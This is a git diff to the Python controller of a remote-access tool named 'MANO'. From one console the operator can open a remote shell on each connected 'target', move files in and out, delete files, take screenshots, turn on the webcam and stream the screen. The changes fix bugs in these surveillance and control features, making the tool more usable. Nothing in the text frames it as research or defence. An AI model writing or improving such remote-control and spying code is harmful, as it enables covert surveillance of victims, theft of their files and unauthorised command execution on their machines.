@@ -8,6 +8,7 @@ import shutil
 import cv2
 import pickle
 import struct
+import datetime
 from queue import Queue
 
 #global variables
@@ -18,6 +19,7 @@ clients = []
 host = ""
 port = 9999
 sock = None
+exit = False
 
 # display banner
 def banner():
@@ -65,19 +67,21 @@ def bind_socket():
 def close_all_connections():
     for cient in clients:
         cient.close()
-
     del clients[:]
 
 # Handling connection from multiple clients and saving to a list   
 def acceptingconnections():
+    global exit
     close_all_connections()
     while True:
         try:
+            if exit == True:
+                break
             conn, address = sock.accept()
             sock.setblocking(1)  # prevents timeout
             client = Client(conn,address)
             clients.append(client)
-            print("Connection has been established :" + address[0]+"\n>>",end="")
+            print("Connection has been established :" + address[0]+"\nMANO >> ",end="")
         except:
             print("Error accepting connections")
 #----------------------------------------------------------------------------
@@ -102,20 +106,20 @@ class Deleter:
         print(f"""----------------------------------------------------------------------------
 1. Delete file 
 2. Delet Dir/Folder 
-3. Change {self.context.address[0] if self.context else 'your' } directory
+3. Change {self.context.address[0] if self.context else 'your' } working directory
 4. File list
-5. Exit 
+5. Back 
 ----------------------------------------------------------------------------""")
 
     def handle_deleter(self):
         while True:
             self.delete_menu()
-            option = input("Enter your choice : ")
+            option = input("Enter your choice : ").strip()
             if option == '1':
-                file_name=input("Enter file name to delete : ")
+                file_name=input("Enter file name to delete : ").strip()
                 print(self.delete_file(file_name))
             elif option == '2':
-                folder_name=input("Enter folder name to delete : ")
+                folder_name=input("Enter folder name to delete : ").strip()
                 print(self.delete_folder(folder_name))
             elif option == '3':
                 print(self.change_directory())
@@ -155,23 +159,23 @@ class Deleter:
             
     def change_directory(self):
         if isinstance(self.context,Client):
-            self.context.conn.send(('cwd~s').encode("utf-8"))
-            print("client current working dir : "+self.context.conn.recv(1024).decode("utf-8"))
-            if input("Do you want to change (Y/N) ? : ").upper() == 'Y':
-                dire=input("Enter path to change: ")
+            self.context.conn.send(('cdir~s').encode("utf-8"))
+            ccd = self.context.conn.recv(1024).decode("utf-8")
+            print("Client current working directory : "+ccd)
+            if input("Do you want to change (Y/N) ? : ").upper().strip() == 'Y':
+                self.context.conn.send(('Y').encode("utf-8"))
+                dire=input("Enter path to change: ").strip()
                 self.context.conn.send((dire).encode("utf-8"))
                 return self.context.conn.recv(1024).decode("utf-8")
             else:
-                return
+                return ccd
         else:
             try:
                 print("Your current working directory : "+os.getcwd())
-                if input("Do you want to change (Y/N) ? : ").upper() == 'Y':
-                    dire=input("Enter path to change: ")
+                if input("Do you want to change (Y/N) ? : ").upper().strip() == 'Y':
+                    dire=input("Enter path to change: ").strip()
                     os.chdir(dire)
-                    return os.getcwd()
-                else:
-                    return
+                return os.getcwd()
             except Exception as e:
                 return e
             
@@ -195,7 +199,7 @@ class Client:
     #upload file to client
     def send_file(self,filename):
         if os.path.isfile(filename):
-            self.conn.send(str("fup~"+filename).encode("utf-8"))
+            self.conn.send(str("fdown~"+filename).encode("utf-8"))
             self.conn.send(str.encode("EXISTS " + str(os.path.getsize(filename))))
             filesize=int(os.path.getsize(filename))
             userResponse = self.conn.recv(1024).decode("utf-8")
@@ -216,11 +220,11 @@ class Client:
 
     #download file from client
     def receive_file(self,filename):
-        self.conn.send(("fdown~"+filename).encode("utf-8"))
+        self.conn.send(("fup~"+filename).encode("utf-8"))
         data = self.conn.recv(1024).decode("utf-8")
         if data[:6] == 'EXISTS':
             filesize = data[6:]
-            msg = input("File exists, " + str(filesize) +"Bytes, download? (Y/N)? -> ").upper()
+            msg = input("File exists, " + str(filesize) +"Bytes, download? (Y/N)? -> ").upper().strip()
             if msg == 'Y':
                 self.conn.send("OK".encode("utf-8"))
                 f = open(filename, 'wb')
@@ -240,11 +244,11 @@ class Client:
             print("File Does Not Exist!")
 
     #take screenshot of client screen
-    def take_screenshot(self,filename):
+    def take_screenshot(self):
         self.conn.send(('sshot~s').encode("utf-8"))
         msg=self.conn.recv(1024).decode("utf-8")
         if msg=='OK':
-            filename=filename+".jpg"
+            filename= 'screenshot_'+str(datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S"))+'.jpg'
             data = self.conn.recv(1024).decode("utf-8")
             if data[:6] == 'EXISTS':
                 filesize = data[6:]
@@ -258,6 +262,7 @@ class Client:
                     totalRecv += len(data)
                     f.write(data)
                 f.close()
+                print("Screenshot saved as "+filename)
             else:
                 print("Fail to take screenshot!")
         else:
@@ -265,6 +270,7 @@ class Client:
 
     #access client camera
     def access_camera(self):
+        self.conn.send(('cam~s').encode("utf-8"))
         K=self.conn.recv(1024).decode("utf-8")
         if K=="OK":
             C=self.conn.recv(1024).decode("utf-8")
@@ -296,6 +302,7 @@ class Client:
 
     #stream client screen
     def stream_screen(self):
+        self.conn.send(('sst~s').encode("utf-8"))
         K=self.conn.recv(1024).decode("utf-8")
         if K=="OK":
             while True:
@@ -333,7 +340,7 @@ class Client:
         print(client_response, end="")
         while True:
             try:
-                cmd = input('')
+                cmd = input('').strip()
                 if cmd== 'quit':
                     return
                 cmd='cmd~'+cmd
@@ -347,7 +354,7 @@ class Client:
 
     #close connection
     def close(self):
-        self.conn.close()
+        self.conn.send(('exit~s').encode("utf-8"))
         return
     
     def help(self):
@@ -369,7 +376,7 @@ stream  --> To stream target screen
 clear   --> Clear the screen
 help    --> Help 
 back    --> Back to MANO
-exit    --> To terminate : {self.address[0]}""")
+close    --> To terminate : {self.address[0]}""")
         
         #commands that perform on client
     def menu(self):
@@ -377,18 +384,20 @@ exit    --> To terminate : {self.address[0]}""")
         banner()
         deleter = Deleter(None)
         while True:
-            cli= input("MANO >>"+self.address[0]+" >> ")
-            if cli=='shell':
+            cli= input("MANO >>"+self.address[0]+" >> ").strip()
+            if cli == "":
+                continue
+            elif cli=='shell':
                 self.send_command('echo')
             elif cli=='clear':
                 os.system('cls' if os.name == 'nt' else 'clear')
                 banner()
             elif cli=='fdown':
-                filename=input("Enter file name to download : ")
-                print(self.receive_file(filename))
+                filename=input("Enter file name to download : ").strip()
+                self.receive_file(filename)
             elif cli=='fup':
-                filename=input("Enter file name to upload : ")
-                print(self.send_file(filename))
+                filename=input("Enter file name to upload : ").strip()
+                self.send_file(filename)
             elif cli=='fl':
                 print(deleter.list_files())
             elif cli=='cfl':
@@ -398,14 +407,14 @@ exit    --> To terminate : {self.address[0]}""")
             elif cli=='ccd':
                 print(self.deleter.change_directory())            
             elif cli=='cdel':
-                print(self.deleter.delete_file())
+                self.deleter.handle_deleter()
             elif cli=='fdel':
-                print(deleter.delete_file())
+                deleter.handle_deleter()
             elif cli=='pwd':
                 print("Your current working directory : "+os.getcwd())
             elif cli=='cwd':
                 self.conn.send(('cwd~s').encode("utf-8"))
-                print("Client current working directory :"+self.conn.recv(1024).decode("utf-8"))
+                print("Client current working directory : "+self.conn.recv(1024).decode("utf-8"))
             elif cli=='sshot':
                 self.take_screenshot()
             elif cli=='cam':
@@ -414,8 +423,8 @@ exit    --> To terminate : {self.address[0]}""")
                 self.stream_screen()
             elif cli=='back':
                 return
-            elif cli=='exit':
-                self.conn.send(('exit~s').encode("utf-8"))
+            elif cli=='close':
+                self.close()
                 return
             elif cli == 'help':
                 self.help()
@@ -467,11 +476,14 @@ quit      --> quit\n""")
     
 #MANO 
 def MANO():
+    global exit
     banner()
     self=Deleter(None)
     while True:
-        cmd = input('MANO >> ')
-        if cmd == 'list':
+        cmd = input('MANO >> ').strip()
+        if cmd == '':
+            continue
+        elif cmd == 'list':
             list_connections()
         elif 'select' in cmd:
             client = select_client(cmd)
@@ -492,7 +504,8 @@ def MANO():
             main_help()
         elif cmd == 'quit':
             close_all_connections()
-            sys.exit(0)
+            exit = True
+            return  "exit"
         else :
               print("Command not recognized")
               
@@ -507,6 +520,7 @@ def createThreads():
 # Do next thread that is in the queue (handle connections)
 def deQueue():
     while True:
+        global exit
         x = queue.get()
         if x == 1:
             create_socket()
@@ -514,7 +528,10 @@ def deQueue():
             acceptingconnections()
         if x == 2:
             time.sleep(0.1)
-            MANO()
+            if MANO() == "exit":
+                return
+        if exit:
+            break
         queue.task_done()
 
 #Insert thread into Queue
